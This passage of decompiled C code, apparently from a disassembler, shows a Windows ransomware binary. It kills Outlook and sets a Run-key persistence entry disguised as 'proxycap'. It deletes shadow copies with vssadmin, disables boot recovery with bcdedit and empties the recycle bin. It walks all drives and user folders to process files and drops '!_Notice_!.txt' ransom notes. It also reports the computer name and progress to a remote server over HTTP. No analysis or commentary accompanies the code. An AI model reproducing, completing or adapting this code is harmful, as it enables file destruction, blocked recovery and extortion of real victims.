    v49 -= v54;
    if ( !(unsigned int)sub_14001C080(v71, byte_140143640, v81, byte_140145660, v54) )
      break;
    if ( (_DWORD)v2 )
    {
      common_fseek(v26, v51, 0i64);
      v55 = 0i64;
      do
        v55 += fwrite(&byte_140143640[v55], 1ui64, (int)v2 - v55, v26);
      while ( v55 < (int)v2 );
      v52 = v69;
    }
    common_fseek(v26, v52, 0i64);
    v56 = v81[0];
    v57 = 0i64;
    v58 = v81[0] - (int)v2;
    if ( v81[0] != (_DWORD)v2 )
    {
      do
        v57 += fwrite(&byte_140143640[(int)v2 + v57], 1ui64, v58 - v57, v26);
      while ( v57 < v58 );
      v56 = v81[0];
      v52 = v69;
    }
    v51 = v73;
    v59 = v56 - (int)v2;
    LODWORD(v2) = 0;
    v52 += v59;
    v69 = v52;
    if ( v49 <= 0 )
      goto LABEL_69;
  }
  v24 = v71;
LABEL_87:
  v2 = v70;
LABEL_89:
  if ( *errno() )
    v67 = *errno();
  else
    v67 = -1;
LABEL_92:
  if ( v26 )
    fclose(v26);
  if ( Block )
    j__free_base(Block);
  if ( v2 )
    j__free_base(v2);
  if ( v24 )
  {
    sub_14001B600((__int64)v24);
    sub_14001B4E0(v24);
  }
  return v67;
}
// 140001925: variable 'v28' is possibly undefined
// 140001925: variable 'v29' is possibly undefined
// 140001925: variable 'v30' is possibly undefined
// 14000347C: using guessed type void __fastcall __noreturn _report_rangecheckfailure(_QWORD, _QWORD, _QWORD, _QWORD);
// 14000564C: using guessed type __int64 __fastcall common_fseek(_QWORD, _QWORD, _QWORD);
// 140006138: using guessed type __int64 __fastcall common_ftell<__int64>(_QWORD);
// 140001000: using guessed type _DWORD var_E0[28];
// 140001000: using guessed type _BYTE var_50[32];
// 140001000: using guessed type char var_178[136];

//----- (0000000140001930) ----------------------------------------------------
void *sub_140001930()
{
  return &unk_140147E88;
}

//----- (0000000140001940) ----------------------------------------------------
int sub_140001940(char *Buffer, char *Format, ...)
{
  _QWORD *v4; // rax
  int result; // eax
  va_list va; // [rsp+60h] [rbp+18h] BYREF

  va_start(va, Format);
  v4 = sub_140001930();
  result = _stdio_common_vsprintf(*v4 | 1i64, Buffer, 0xFFFFFFFFFFFFFFFFui64, Format, 0i64, va);
  if ( result < 0 )
    return -1;
  return result;
}

//----- (00000001400019A0) ----------------------------------------------------
DWORD __fastcall StartAddress(const char *lpThreadParameter)
{
  void *v2; // rsi
  char *v4; // rdi
  INTERNET_PORT v5; // bx
  int v6; // r14d
  char *v7; // rax
  const char *v8; // rbp
  const char *v9; // rdx
  size_t v10; // rdi
  __int64 v11; // rdx
  __int64 v12; // rcx
  __int64 v13; // r8
  __int64 v14; // r9
  char *v15; // rax
  void *v16; // rax
  void *v17; // rdi
  void *v18; // rbx
  DWORD nSize; // [rsp+40h] [rbp-388h] BYREF
  LPCSTR lpszAcceptTypes[3]; // [rsp+48h] [rbp-380h] BYREF
  CHAR szServerName[272]; // [rsp+60h] [rbp-368h] BYREF
  CHAR Buffer[272]; // [rsp+170h] [rbp-258h] BYREF
  CHAR szObjectName[272]; // [rsp+280h] [rbp-148h] BYREF

  nSize = 260;
  lpszAcceptTypes[0] = "text/*";
  lpszAcceptTypes[1] = 0i64;
  v2 = 0i64;
  if ( !GetComputerNameA(Buffer, &nSize) )
    return GetLastError();
  v4 = strstr(String1, "://");
  if ( v4 )
  {
    if ( !strnicmp(String1, "https://", 7ui64) )
    {
      v5 = 443;
      v6 = 1;
    }
    else
    {
      v6 = 0;
      v5 = 80;
    }
    v7 = strchr(v4 + 3, 47);
    v8 = v7;
    if ( v7 )
    {
      v9 = v4 + 3;
      v10 = v7 - v4 - 3;
      strncpy(szServerName, v9, v10);
      if ( v10 >= 0x104 )
        _report_rangecheckfailure(v12, v11, v13, v14);
      szServerName[v10] = 0;
      sub_140001940(szObjectName, "%s?name=%s&state=%s", v8, Buffer, lpThreadParameter);
      v15 = strchr(szServerName, 58);
      if ( v15 )
      {
        *v15 = 0;
        v5 = sub_14000B3C8((__int64)(v15 + 1));
      }
      v16 = InternetOpenA(0i64, 0, 0i64, 0i64, 0);
      v17 = v16;
      if ( v16 )
      {
        v18 = InternetConnectA(v16, szServerName, v5, 0i64, 0i64, 3u, 0, 0i64);
        if ( v18 )
        {
          v2 = HttpOpenRequestA(v18, "GET", szObjectName, 0i64, 0i64, lpszAcceptTypes, v6 != 0 ? 0x803000 : 0, 0i64);
          HttpSendRequestA(v2, 0i64, 0, 0i64, 0);
        }
        InternetCloseHandle(v17);
        if ( v18 )
          InternetCloseHandle(v18);
        if ( v2 )
          InternetCloseHandle(v2);
      }
    }
  }
  return 0;
}
// 140001C22: variable 'v12' is possibly undefined
// 140001C22: variable 'v11' is possibly undefined
// 140001C22: variable 'v13' is possibly undefined
// 140001C22: variable 'v14' is possibly undefined
// 14000347C: using guessed type void __fastcall __noreturn _report_rangecheckfailure(_QWORD, _QWORD, _QWORD, _QWORD);
// 1400019A0: using guessed type CHAR szServerName[272];

//----- (0000000140001C30) ----------------------------------------------------
int __fastcall main(int argc, const char **argv, const char **envp)
{
  __int64 v5; // r14
  wchar_t **v6; // rdi
  unsigned int TickCount; // eax
  HANDLE Toolhelp32Snapshot; // rax
  void *v9; // rsi
  HANDLE v10; // rax
  void *v11; // rbx
  DWORD ModuleFileNameA; // eax
  unsigned __int64 v13; // rbx
  __int64 v14; // rdx
  __int64 v15; // rcx
  __int64 v16; // r8
  __int64 v17; // r9
  __int64 v18; // rax
  DWORD FileAttributesW; // eax
  char v20; // bl
  int v21; // eax
  wchar_t **v22; // rax
  void **v23; // rsi
  HANDLE FileW; // rbx
  int v25; // eax
  void **v26; // rbx
  __int64 v27; // r9
  wchar_t **i; // rax
  int v29; // eax
  wchar_t *v30; // rbx
  int v31; // eax
  size_t v32; // rcx
  WCHAR *v33; // rax
  wchar_t **v34; // rax
  wchar_t *v35; // rcx
  void **v36; // rbx
  HKEY hKey; // [rsp+40h] [rbp-C0h] BYREF
  DWORD v39[2]; // [rsp+48h] [rbp-B8h] BYREF
  HANDLE Thread; // [rsp+50h] [rbp-B0h] BYREF
  HANDLE v41; // [rsp+58h] [rbp-A8h]
  HANDLE v42; // [rsp+60h] [rbp-A0h]
  char Buffer[256]; // [rsp+70h] [rbp-90h] BYREF
  char v44[256]; // [rsp+170h] [rbp+70h] BYREF
  PROCESSENTRY32W pe; // [rsp+270h] [rbp+170h] BYREF
  CHAR MultiByteStr[512]; // [rsp+680h] [rbp+580h] BYREF
  CHAR Filename[32768]; // [rsp+880h] [rbp+780h] BYREF

  SetErrorMode(1u);
  GetCommandLineW();
  v5 = 0i64;
  *(_QWORD *)v39 = 0i64;
  v6 = 0i64;
  sub_14001E0C0(12, 0i64);
  TickCount = GetTickCount();
  srand(TickCount);
  Toolhelp32Snapshot = CreateToolhelp32Snapshot(0xFu, 0);
  pe.dwSize = 568;
  v9 = Toolhelp32Snapshot;
  if ( Process32FirstW(Toolhelp32Snapshot, &pe) )
  {
    do
    {
      if ( !wcsicmp(pe.szExeFile, L"outlook.exe") )
      {
        v10 = OpenProcess(1u, 0, pe.th32ProcessID);
        v11 = v10;
        if ( v10 )
        {
          TerminateProcess(v10, 9u);
          CloseHandle(v11);
        }
      }
    }
    while ( Process32NextW(v9, &pe) );
  }
  CloseHandle(v9);
  ModuleFileNameA = GetModuleFileNameA(0i64, Filename, 0x8000u);
  v13 = ModuleFileNameA;
  if ( ModuleFileNameA && !RegOpenKeyA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", &hKey) )
  {
    if ( v13 >= 0x8000 )
      _report_rangecheckfailure(v15, v14, v16, v17);
    Filename[v13] = 0;
    v18 = -1i64;
    do
      ++v18;
    while ( Filename[v18] );
    RegSetValueExA(hKey, "proxycap", 0, 1u, (const BYTE *)Filename, v18 + 1);
    RegCloseKey(hKey);
  }
  SHEmptyRecycleBinW(0i64, 0i64, 7u);
  WinExec("vssadmin.exe delete shadows /all /quiet", 0);
  WinExec("bcdedit.exe /set {default} recoveryenabled no", 0);
  WinExec("bcdedit.exe /set {default} bootstatuspolicy ignoreallfailures", 0);
  WinExec("bcdedit.exe /set {current} recoveryenabled no", 0);
  WinExec("bcdedit.exe /set {current} bootstatuspolicy ignoreallfailures", 0);
  Thread = CreateThread(0i64, 0i64, (LPTHREAD_START_ROUTINE)StartAddress, "start", 0, 0i64);
  if ( argc <= 1 )
  {
    v22 = (wchar_t **)sub_140002FF0(aCUsersPublicPr, v39);
  }
  else
  {
    FileAttributesW = GetFileAttributesW((LPCWSTR)argv[1]);
    v20 = FileAttributesW;
    if ( FileAttributesW == -1 )
      goto LABEL_19;
    v21 = WideCharToMultiByte(0, 0, (LPCWCH)argv[1], -1, 0i64, 0, 0i64, 0i64);
    WideCharToMultiByte(0, 0, (LPCWCH)argv[1], -1, MultiByteStr, v21, 0i64, 0i64);
    if ( (v20 & 0x10) != 0 )
      v22 = sub_140002BC0((const WCHAR *)argv[1], v39);
    else
      v22 = (wchar_t **)sub_140002FF0(MultiByteStr, v39);
  }
  v5 = *(_QWORD *)v39;
  v6 = v22;
LABEL_19:
  v23 = (void **)sub_140002180();
  while ( v23 )
  {
    wsprintfW((LPWSTR)&pe, L"%s\\!_Notice_!.txt", *v23);
    FileW = CreateFileW((LPCWSTR)&pe, 0x120116u, 3u, 0i64, 2u, 0x80u, 0i64);
    if ( FileW != (HANDLE)-1i64 )
    {
      v25 = lstrlenA(::Buffer);
      WriteFile(FileW, ::Buffer, v25, v39, 0i64);
      CloseHandle(FileW);
    }
    v26 = v23;
    v23 = (void **)v23[1];
    j__free_base(*v26);
    j__free_base(v26);
  }
  v27 = 0i64;
  for ( i = v6; i; ++v27 )
    i = (wchar_t **)i[1];
  sub_140001940(Buffer, "success %lld, retry %lld", v5, v27);
  v41 = CreateThread(0i64, 0i64, (LPTHREAD_START_ROUTINE)StartAddress, Buffer, 0, 0i64);
  while ( v6 )
  {
    v29 = sub_140001000(*v6);
    if ( v29 )
    {
      if ( v29 == 13 )
      {
        v30 = (wchar_t *)j__malloc_base(0x10ui64);
        v31 = lstrlenW(*v6);
        v32 = (unsigned int)(2 * (v31 + 1));
        if ( !is_mul_ok(2u, v31 + 1) )
          v32 = -1i64;
        v33 = (WCHAR *)j__malloc_base(v32);
        *(_QWORD *)v30 = v33;
        lstrcpyW(v33, *v6);
        *((_QWORD *)v30 + 1) = v6;
        v34 = v6;
        if ( v6[1] )
        {
          do
          {
            v35 = v34[1];
            *((_QWORD *)v30 + 1) = v35;
            v34 = (wchar_t **)v35;
          }
          while ( *((_QWORD *)v35 + 1) );
        }
        v34[1] = v30;
        *((_QWORD *)v30 + 1) = 0i64;
        Sleep(0xAu);
      }
    }
    else
    {
      ++v5;
    }
    v36 = (void **)v6;
    v6 = (wchar_t **)v6[1];
    j__free_base(*v36);
    j__free_base(v36);
  }
  sub_140001940(v44, "End %lld", v5);
  v42 = CreateThread(0i64, 0i64, (LPTHREAD_START_ROUTINE)StartAddress, v44, 0, 0i64);
  WaitForMultipleObjects(3u, &Thread, 1, 0x3A98u);
  CloseHandle(Thread);
  CloseHandle(v41);
  CloseHandle(v42);
  return 0;
}
// 140002179: variable 'v15' is possibly undefined
// 140002179: variable 'v14' is possibly undefined
// 140002179: variable 'v16' is possibly undefined
// 140002179: variable 'v17' is possibly undefined
// 14000347C: using guessed type void __fastcall __noreturn _report_rangecheckfailure(_QWORD, _QWORD, _QWORD, _QWORD);
// 140001C30: using guessed type CHAR Filename[32768];

//----- (0000000140002180) ----------------------------------------------------
_QWORD *sub_140002180()
{
  _QWORD *v0; // rdi
  unsigned __int8 v1; // r14
  DWORD LogicalDrives; // esi
  unsigned int v3; // r15d
  WCHAR v4; // ax
  _QWORD *v5; // rbx
  __int64 v6; // rcx
  WCHAR *v7; // rax
  _QWORD *v8; // rcx
  _QWORD *v9; // rax
  HANDLE FirstFileW; // r14
  _QWORD *v11; // rbx
  __int64 v12; // rcx
  __int64 v13; // rax
  WCHAR *v14; // rax
  _QWORD *v15; // rcx
  _QWORD *v16; // rax
  __int64 v17; // r8
  HANDLE v18; // rsi
  _QWORD *v19; // rbx
  __int64 v20; // rcx
  __int64 v21; // rax
  __int64 v22; // rcx
  __int64 v23; // rax
  WCHAR *v24; // rax
  _QWORD *v25; // rax
  _QWORD *v26; // rcx
  struct _WIN32_FIND_DATAW FindFileData; // [rsp+30h] [rbp-D0h] BYREF
  struct _WIN32_FIND_DATAW v29; // [rsp+280h] [rbp+180h] BYREF
  WCHAR String2[4]; // [rsp+4D0h] [rbp+3D0h] BYREF
  WCHAR Dst[264]; // [rsp+4E0h] [rbp+3E0h] BYREF
  WCHAR String1[32768]; // [rsp+6F0h] [rbp+5F0h] BYREF
  WCHAR FileName[32768]; // [rsp+106F0h] [rbp+105F0h] BYREF

  v0 = 0i64;
  v1 = 0;
  LogicalDrives = GetLogicalDrives();
  wcscpy(String2, L"A:\\");
  if ( LogicalDrives )
  {
    do
    {
      v3 = LogicalDrives;
      v4 = v1++ + 65;
      String2[0] = v4;
      if ( (LogicalDrives & 1) != 0 )
      {
        v5 = j__malloc_base(0x10ui64);
        v6 = -1i64;
        do
          ++v6;
        while ( String2[v6] );
        v7 = (WCHAR *)j__malloc_base(saturated_mul(v6 + 1, 2ui64));
        *v5 = v7;
        lstrcpyW(v7, String2);
        if ( v0 )
        {
          v5[1] = v0;
          v8 = v0;
          if ( v0[1] )
          {
            do
            {
              v9 = (_QWORD *)v8[1];
              v5[1] = v9;
              v8 = v9;
            }
            while ( v9[1] );
          }
          v8[1] = v5;
        }
        else
        {
          v0 = v5;
        }
        v5[1] = 0i64;
      }
      LogicalDrives >>= 1;
    }
    while ( v3 >= 2 );
  }
  if ( ExpandEnvironmentStringsW(L"%SystemDrive%\\Users", Dst, 0x104u) )
  {
    lstrcpyW(String1, Dst);
    lstrcatW(String1, L"\\*");
    FirstFileW = FindFirstFileW(String1, &FindFileData);
    if ( FirstFileW != (HANDLE)-1i64 )
    {
      do
      {
        if ( lstrcmpW(FindFileData.cFileName, L".")
          && lstrcmpW(FindFileData.cFileName, L"..")
          && (FindFileData.dwFileAttributes & 0x10) != 0
          && lstrcmpiW(FindFileData.cFileName, L"All Users") )
        {
          v11 = j__malloc_base(0x10ui64);
          v12 = -1i64;
          do
            ++v12;
          while ( FindFileData.cFileName[v12] );
          v13 = -1i64;
          do
            ++v13;
          while ( Dst[v13] );
          v14 = (WCHAR *)j__malloc_base(saturated_mul(v13 + 2 + v12, 2ui64));
          *v11 = v14;
          wsprintfW(v14, L"%s\\%s", Dst, FindFileData.cFileName);
          if ( v0 )
          {
            v11[1] = v0;
            v15 = v0;
            if ( v0[1] )
            {
              do
              {
                v16 = (_QWORD *)v15[1];
                v11[1] = v16;
                v15 = v16;
              }
              while ( v16[1] );
            }
            v15[1] = v11;
          }
          else
          {
            v0 = v11;
          }
          v17 = *v11;
          v11[1] = 0i64;
          wsprintfW(FileName, L"%s\\*", v17);
          v18 = FindFirstFileW(FileName, &v29);
          if ( v18 )
          {
            do
            {
              if ( lstrcmpW(v29.cFileName, L".") && lstrcmpW(v29.cFileName, L"..") && (v29.dwFileAttributes & 0x10) != 0 )
              {
                v19 = j__malloc_base(0x10ui64);
                v20 = -1i64;
                do
                  ++v20;
                while ( v29.cFileName[v20] );
                v21 = -1i64;
                do
                  ++v21;
                while ( FindFileData.cFileName[v21] );
                v22 = v21 + v20;
                v23 = -1i64;
                do
                  ++v23;
                while ( Dst[v23] );
                v24 = (WCHAR *)j__malloc_base(saturated_mul(v23 + 3 + v22, 2ui64));
                *v19 = v24;
                wsprintfW(v24, L"%s\\%s\\%s", Dst, FindFileData.cFileName, v29.cFileName);
                if ( v0 )
                {
                  v19[1] = v0;
                  v25 = v0;
                  if ( v0[1] )
                  {
                    do
                    {
                      v26 = (_QWORD *)v25[1];
                      v19[1] = v26;
                      v25 = v26;
                    }
                    while ( v26[1] );
                  }
                  v25[1] = v19;
                }
                else
                {
                  v0 = v19;
                }
                v19[1] = 0i64;
              }
            }
            while ( FindNextFileW(v18, &v29) );
            FindClose(v18);
          }
        }
      }
      while ( FindNextFileW(FirstFileW, &FindFileData) );
      FindClose(FirstFileW);
    }
  }
  return v0;
}
// 140002180: using guessed type WCHAR Dst[264];

//----- (00000001400025E0) ----------------------------------------------------
__int64 sub_1400025E0(__int64 a1, ...)
{
  FILE *v2; // rbx
  __int64 *v3; // rax
  va_list va; // [rsp+58h] [rbp+10h] BYREF

  va_start(va, a1);
  v2 = _acrt_iob_func(1u);
  v3 = (__int64 *)sub_140001930();
  return sub_14000A13C(*v3, (__int64)v2, a1, 0i64, (__int64)va);
}

//----- (0000000140002640) ----------------------------------------------------
__int64 sub_140002640(__int64 a1, __int64 a2, ...)
{
  __int64 *v4; // rax
  va_list va; // [rsp+60h] [rbp+18h] BYREF

  va_start(va, a2);
  v4 = (__int64 *)sub_140001930();
  return sub_14000A0B0(*v4, a1, a2, 0i64, (__int64)va);
}

//----- (0000000140002690) ----------------------------------------------------
_QWORD *__fastcall sub_140002690(_QWORD *a1)
{
  _QWORD *v1; // r12
  void **v3; // r15
  DWORD LogicalDrives; // edi
  unsigned __int8 v5; // si
  unsigned int TickCount; // eax
  unsigned int v7; // r14d
  WCHAR v8; // ax
  _QWORD *v9; // rbx
  __int64 v10; // rcx
  WCHAR *v11; // rax
  void **v12; // rcx
  void **v13; // rax
  int v14; // r14d
  HANDLE FirstFileW; // rdi
  unsigned int v16; // eax
  _QWORD *v17; // rbx
  __int64 v18; // rcx
  WCHAR *v19; // rax
  void **v20; // rcx
  void **v21; // rax
  wchar_t *v22; // rax
  int v23; // eax
  int v24; // eax
  size_t v25; // rcx
  WCHAR *v26; // rax
  _QWORD *v27; // rcx
  _QWORD *v28; // rax
  void **v29; // rbx
  _QWORD *v31; // [rsp+20h] [rbp-E0h]
  struct _WIN32_FIND_DATAW FindFileData; // [rsp+30h] [rbp-D0h] BYREF
  WCHAR String2[4]; // [rsp+280h] [rbp+180h] BYREF
  WCHAR Destination[20]; // [rsp+288h] [rbp+188h] BYREF
  wchar_t String[32768]; // [rsp+2B0h] [rbp+1B0h] BYREF
  WCHAR String1[32768]; // [rsp+102B0h] [rbp+101B0h] BYREF
  WCHAR Filename[32768]; // [rsp+202B0h] [rbp+201B0h] BYREF

  v1 = 0i64;
  v3 = 0i64;
  memset(Filename, 0, sizeof(Filename));
  LogicalDrives = GetLogicalDrives();
  v5 = 0;
  wcscpy(String2, L"A:\\");
  v31 = sub_1400031A0();
  TickCount = GetTickCount();
  srand(TickCount);
  GetModuleFileNameW(0i64, Filename, 0x10000u);
  if ( !LogicalDrives )
    goto LABEL_48;
  do
  {
    v7 = LogicalDrives;
    v8 = v5++ + 65;
    String2[0] = v8;
    if ( (LogicalDrives & 1) != 0 )
    {
      v9 = j__malloc_base(0x10ui64);
      v10 = -1i64;
      do
        ++v10;
      while ( String2[v10] );
      v11 = (WCHAR *)j__malloc_base(saturated_mul(v10 + 1, 2ui64));
      *v9 = v11;
      lstrcpyW(v11, String2);
      if ( v3 )
      {
        v9[1] = v3;
        v12 = v3;
        if ( v3[1] )
        {
          do
          {
            v13 = (void **)v12[1];
            v9[1] = v13;
            v12 = v13;
          }
          while ( v13[1] );
        }
        v12[1] = v9;
      }
      else
      {
        v3 = (void **)v9;
      }
      v9[1] = 0i64;
    }
    LogicalDrives >>= 1;
  }
  while ( v7 >= 2 );
  v1 = 0i64;
  if ( !v3 )
    goto LABEL_48;
  v14 = -2147483587;
  do
  {
    lstrcpyW(String1, (LPCWSTR)*v3);
    lstrcatW(String1, L"*");
    FirstFileW = FindFirstFileW(String1, &FindFileData);
    if ( FirstFileW == (HANDLE)-1i64 )
      goto LABEL_47;
    do
    {
      if ( lstrcmpW(FindFileData.cFileName, L".")
        && lstrcmpW(FindFileData.cFileName, L"..")
        && wcsicmp(FindFileData.cFileName, L"sample music")
        && wcsicmp(FindFileData.cFileName, L"windows")
        && wcsicmp(FindFileData.cFileName, L"!_Notice_!.txt") )
      {
        lstrcpyW(String, (LPCWSTR)*v3);
        lstrcatW(String, FindFileData.cFileName);
        if ( (FindFileData.dwFileAttributes & 0x10) != 0 )
        {
          v16 = FindFileData.cFileName[0];
          if ( (unsigned __int16)(FindFileData.cFileName[0] - 33) > 0x1Fu
            || (LOWORD(v16) = FindFileData.cFileName[0] - 33, !_bittest(&v14, v16)) )
          {
            lstrcatW(String, L"\\");
            v17 = j__malloc_base(0x10ui64);
            v18 = -1i64;
            do
              ++v18;
            while ( String[v18] );
            v19 = (WCHAR *)j__malloc_base(saturated_mul(v18 + 1, 2ui64));
            *v17 = v19;
            lstrcpyW(v19, String);
            v17[1] = v3;
            v20 = v3;
            if ( v3[1] )
            {
              do
              {
                v21 = (void **)v20[1];
                v17[1] = v21;
                v20 = v21;
              }
              while ( v21[1] );
            }
            v20[1] = v17;
LABEL_44:
            v17[1] = 0i64;
          }
        }
        else
        {
          v22 = wcsrchr(FindFileData.cFileName, 0x2Eu);
          if ( v22 )
          {
            wcsncpy(Destination, v22 + 1, 0xFui64);
            if ( lstrcmpiW(Destination, L"DLL") )
            {
              if ( lstrcmpiW(Filename, String) && (FindFileData.nFileSizeHigh || FindFileData.nFileSizeLow > 4) )
              {
                sub_1400025E0((__int64)L"%s\n", String);
                v23 = sub_140001000(String);
                if ( v23 )
                {
                  if ( v23 != 13 )
                    continue;
                  v17 = j__malloc_base(0x10ui64);
                  v24 = lstrlenW(String);
                  v25 = (unsigned int)(2 * (v24 + 1));
                  if ( !is_mul_ok(2u, v24 + 1) )
                    v25 = -1i64;
                  v26 = (WCHAR *)j__malloc_base(v25);
                  *v17 = v26;
                  lstrcpyW(v26, String);
                  if ( v1 )
                  {
                    v17[1] = v1;
                    v27 = v1;
                    if ( v1[1] )
                    {
                      do
                      {
                        v28 = (_QWORD *)v27[1];
                        v17[1] = v28;
                        v27 = v28;
                      }
                      while ( v28[1] );
                    }
                    v27[1] = v17;
                  }
                  else
                  {
                    v1 = v17;
                  }
                  goto LABEL_44;
                }
                if ( a1 )
                  ++*a1;
              }
            }
          }
        }
      }
    }
    while ( FindNextFileW(FirstFileW, &FindFileData) );
    FindClose(FirstFileW);
LABEL_47:
    v29 = v3;
    v3 = (void **)v3[1];
    j__free_base(*v29);
    j__free_base(v29);
  }
  while ( v3 );
LABEL_48:
  if ( v31 )
    sub_1400032D0(v31);
  return v1;
}
// 1401272E0: using guessed type wchar_t aS_0[4];
// 140002690: using guessed type wchar_t String[32768];

//----- (0000000140002BC0) ----------------------------------------------------
LPWSTR *__fastcall sub_140002BC0(const WCHAR *a1, _QWORD *a2)
{
  LPWSTR *v4; // rdi
  unsigned int TickCount; // eax
  LPWSTR *v6; // rsi
  unsigned __int64 v7; // rcx
  WCHAR *v8; // rax
  int v9; // ebx
  HANDLE FirstFileW; // r15
  WCHAR *v11; // rbx
  __int64 v12; // rcx
  WCHAR *v13; // rax
  LPWSTR *v14; // rcx
  LPWSTR v15; // rax
  wchar_t *v16; // rax
  int v17; // eax
  int v18; // eax
  size_t v19; // rcx
  WCHAR *v20; // rax
  LPWSTR v21; // rax
  void **v22; // rbx
  _QWORD *v24; // [rsp+20h] [rbp-E0h]
  struct _WIN32_FIND_DATAW FindFileData; // [rsp+30h] [rbp-D0h] BYREF
  WCHAR Destination[16]; // [rsp+280h] [rbp+180h] BYREF
  wchar_t String2[32768]; // [rsp+2A0h] [rbp+1A0h] BYREF
  WCHAR String1[32768]; // [rsp+102A0h] [rbp+101A0h] BYREF
  WCHAR Filename[32768]; // [rsp+202A0h] [rbp+201A0h] BYREF

  v4 = 0i64;
  memset(Filename, 0, sizeof(Filename));
  v24 = sub_1400031A0();
  TickCount = GetTickCount();
  srand(TickCount);
  GetModuleFileNameW(0i64, Filename, 0x10000u);
  v6 = (LPWSTR *)j__malloc_base(0x10ui64);
  v7 = -1i64;
  do
    ++v7;
  while ( a1[v7] );
  v8 = (WCHAR *)j__malloc_base(saturated_mul(v7, 4ui64));
  *v6 = v8;
  lstrcpyW(v8, a1);
  lstrcatW(*v6, L"\\");
  v6[1] = 0i64;
  v9 = -2147483587;
  do
  {
    lstrcpyW(String1, *v6);
    lstrcatW(String1, L"*");
    FirstFileW = FindFirstFileW(String1, &FindFileData);
    if ( FirstFileW == (HANDLE)-1i64 )
      goto LABEL_37;
    do
    {
      if ( lstrcmpW(FindFileData.cFileName, L".")
        && lstrcmpW(FindFileData.cFileName, L"..")
        && wcsicmp(FindFileData.cFileName, L"sample music")
        && wcsicmp(FindFileData.cFileName, L"windows")
        && wcsicmp(FindFileData.cFileName, L"!_Notice_!.txt") )
      {
        lstrcpyW(String2, *v6);
        lstrcatW(String2, FindFileData.cFileName);
        if ( (FindFileData.dwFileAttributes & 0x10) != 0 )
        {
          if ( (unsigned __int16)(FindFileData.cFileName[0] - 33) > 0x1Fu
            || !_bittest(&v9, (unsigned __int16)(FindFileData.cFileName[0] - 33)) )
          {
            lstrcatW(String2, L"\\");
            v11 = (WCHAR *)j__malloc_base(0x10ui64);
            v12 = -1i64;
            do
              ++v12;
            while ( String2[v12] );
            v13 = (WCHAR *)j__malloc_base(saturated_mul(v12 + 1, 2ui64));
            *(_QWORD *)v11 = v13;
            lstrcpyW(v13, String2);
            *((_QWORD *)v11 + 1) = v6;
            v14 = v6;
            if ( v6[1] )
            {
              do
              {
                v15 = v14[1];
                *((_QWORD *)v11 + 1) = v15;
                v14 = (LPWSTR *)v15;
              }
              while ( *((_QWORD *)v15 + 1) );
              *((_QWORD *)v15 + 1) = v11;
              goto LABEL_34;
            }
LABEL_32:
            v14[1] = v11;
            goto LABEL_34;
          }
        }
        else
        {
          v16 = wcsrchr(FindFileData.cFileName, 0x2Eu);
          if ( v16 )
          {
            wcsncpy(Destination, v16 + 1, 0xFui64);
            if ( lstrcmpiW(Destination, L"DLL") )
            {
              if ( lstrcmpiW(Filename, String2) && (FindFileData.nFileSizeHigh || FindFileData.nFileSizeLow > 4) )
              {
                v17 = sub_140001000(String2);
                if ( v17 )
                {
                  if ( v17 != 13 )
                    continue;
                  v11 = (WCHAR *)j__malloc_base(0x10ui64);
                  v18 = lstrlenW(String2);
                  v19 = (unsigned int)(2 * (v18 + 1));
                  if ( !is_mul_ok(2u, v18 + 1) )
                    v19 = -1i64;
                  v20 = (WCHAR *)j__malloc_base(v19);
                  *(_QWORD *)v11 = v20;
                  lstrcpyW(v20, String2);
                  if ( v4 )
                  {
                    *((_QWORD *)v11 + 1) = v4;
                    v14 = v4;
                    if ( v4[1] )
                    {
                      do
                      {
                        v21 = v14[1];
                        *((_QWORD *)v11 + 1) = v21;
                        v14 = (LPWSTR *)v21;
                      }
                      while ( *((_QWORD *)v21 + 1) );
                    }
                    goto LABEL_32;
                  }
                  v4 = (LPWSTR *)v11;
LABEL_34:
                  *((_QWORD *)v11 + 1) = 0i64;
                  v9 = -2147483587;
                  continue;
                }
                if ( a2 )
                  ++*a2;
              }
            }
          }
        }
      }
    }
    while ( FindNextFileW(FirstFileW, &FindFileData) );
    FindClose(FirstFileW);
LABEL_37:
    v22 = (void **)v6;
    v6 = (LPWSTR *)v6[1];
    j__free_base(*v22);
    j__free_base(v22);
    v9 = -2147483587;
  }
  while ( v6 );
  if ( v24 )
    sub_1400032D0(v24);
  return v4;
}
// 140002BC0: using guessed type wchar_t String2[32768];

//----- (0000000140002FF0) ----------------------------------------------------
_QWORD *__fastcall sub_140002FF0(const char *a1, _QWORD *a2)
{
  _QWORD *v3; // rdi
  FILE *v4; // rax
  FILE *v5; // rbp
  unsigned __int64 v7; // rax
  __int64 v8; // rdx
  __int64 v9; // rcx
  __int64 v10; // r8
  __int64 v11; // r9
  int v12; // eax
  _QWORD *v13; // rbx
  int v14; // eax
  size_t v15; // rcx
  WCHAR *v16; // rax
  _QWORD *v17; // rax
  _QWORD *v18; // rcx

  v3 = 0i64;
  v4 = fopen(a1, "r");
  v5 = v4;
  if ( !v4 )
    return sub_140002690(a2);
  if ( common_fgets<char>(Str1, 2048i64, v4) && !strcmp((const char *)Str1, "*tfloweridxfile\n") )
  {
    while ( !feof(v5) )
    {
      common_fgets<wchar_t>(Str1, 1024i64, v5);
      v7 = lstrlenW(Str1) - 1;
      if ( v7 >= 1024 )
        _report_rangecheckfailure(v9, v8, v10, v11);
      Str1[v7] = 0;
      v12 = sub_140001000(Str1);
      if ( !a2 || v12 )
      {
        if ( v12 == 13 )
        {
          v13 = j__malloc_base(0x10ui64);
          v14 = lstrlenW(Str1);
          v15 = (unsigned int)(2 * (v14 + 1));
          if ( !is_mul_ok(2u, v14 + 1) )
            v15 = -1i64;
          v16 = (WCHAR *)j__malloc_base(v15);
          *v13 = v16;
          lstrcpyW(v16, Str1);
          if ( v3 )
          {
            v13[1] = v3;
            v17 = v3;
            if ( v3[1] )
            {
              do
              {
                v18 = (_QWORD *)v17[1];
                v13[1] = v18;
                v17 = v18;
              }
              while ( v18[1] );
            }
            v17[1] = v13;
          }
          else
          {
            v3 = v13;
          }
          v13[1] = 0i64;
        }
      }
      else
      {
        ++*a2;
      }
    }
    fclose(v5);
    return v3;
  }
  else
  {
    fclose(v5);
    return sub_140002690(a2);
  }
}
// 140003198: variable 'v9' is possibly undefined
// 140003198: variable 'v8' is possibly undefined
// 140003198: variable 'v10' is possibly undefined
// 140003198: variable 'v11' is possibly undefined
// 14000347C: using guessed type void __fastcall __noreturn _report_rangecheckfailure(_QWORD, _QWORD, _QWORD, _QWORD);
// 14000D01C: using guessed type __int64 __fastcall common_fgets<char>(_QWORD, _QWORD, _QWORD);
// 14000D024: using guessed type __int64 __fastcall common_fgets<wchar_t>(_QWORD, _QWORD, _QWORD);
